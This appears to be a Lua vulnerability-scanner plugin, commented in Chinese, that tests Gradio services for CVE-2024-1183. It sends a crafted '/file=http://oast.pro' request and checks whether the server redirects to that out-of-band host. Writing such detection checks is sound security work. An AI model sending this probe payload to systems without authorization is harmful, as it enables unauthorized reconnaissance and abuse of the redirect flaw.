-- CVE-2024-1183 漏洞检测函数
function check_CVE_2024_1183(target)
    print("[Gradio] Starting CVE-2024-1183 check for", target)
    
    -- 构造探测URL
    local test_url = target .. "/file=http://oast.pro"
    print("[Gradio] Testing URL:", test_url)
    
    -- 发送请求
    local resp = http.get(test_url, {
        timeout = 10,
        headers = {
            ["Host"] = target:match("https?://([^/]+)"),
            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    })
    
    if not resp then
        print("[Gradio] No response received")
        return nil
    end
    
    print("[Gradio] Response status:", resp.status)
    print("[Gradio] ===== Response Headers =====")
    if resp.headers then
        for k, v in pairs(resp.headers) do
            print(string.format("[Gradio] %s: %s", k, v))
        end
    else
        print("[Gradio] No headers found")
    end
    
    print("[Gradio] ===== Response Body =====")
    if resp.body then
        -- 打印原始内容
        print("[Gradio] Raw body length:", #resp.body)
        print("[Gradio] Raw body content:")
        print(resp.body)
        
        -- 尝试解析并格式化 JSON
        local success, decoded = pcall(function()
            return json.decode(resp.body)
        end)
        if success and decoded then
            print("[Gradio] Decoded JSON:")
            for k, v in pairs(decoded) do
                print(string.format("[Gradio] %s: %s", k, tostring(v)))
            end
        end
    else
        print("[Gradio] No body found")
    end
    print("[Gradio] ========================")
    
    -- 检查响应头中的 Location
    if resp.headers["Location"] then
        print("[Gradio] Found Location header:", resp.headers["Location"])
        
        -- 使用正则表达式匹配 Location 头
        local location = resp.headers["Location"]
        if string.match(location, "^https?://[%w%.%-_@]*oast%.pro") or 
           string.match(location, "^//[%w%.%-_@]*oast%.pro") then
            print("[Gradio] SSRF vulnerability confirmed!")
            return {
                CVEID = "CVE-2024-1183",
                Severity = "high",
                Type = "ssrf"
            }
        end
    else
        print("[Gradio] No Location header found in headers")
    end
    
    -- 检查响应体中是否包含重定向信息
    if resp.body then
        print("[Gradio] Checking response body for redirect information")
        if string.match(resp.body, "oast%.pro") then
            print("[Gradio] Found oast.pro reference in response body!")
            return {
                CVEID = "CVE-2024-1183",
                Severity = "high",
                Type = "ssrf"
            }
        end
    end
    
    return nil
end

function Analyze(info)
    if not info or not info.IP or not info.Port then
        print("[Gradio] Invalid ServiceInfo: missing IP or Port")
        return info
    end

    print("[Gradio] Starting analysis for", info.IP..":", info.Port)
    
    -- 构造目标URL
    local target = string.format("http://%s:%d", info.IP, info.Port)
    print("[Gradio] Target URL:", target)
    
    -- 检查各个CVE
    local vulns = {}
    
    -- 检查 CVE-2024-1183
    local result = check_CVE_2024_1183(target)
    if result then
        table.insert(vulns, result)
        print("[Gradio] Added vulnerability:", result.CVEID)
    end
    
    -- 如果发现漏洞，添加到结果中
    if #vulns > 0 then
        info.Vulnerabilities = vulns
        print("[Gradio] Total vulnerabilities found:", #vulns)
    else
        print("[Gradio] No vulnerabilities found")
    end

    return info
end 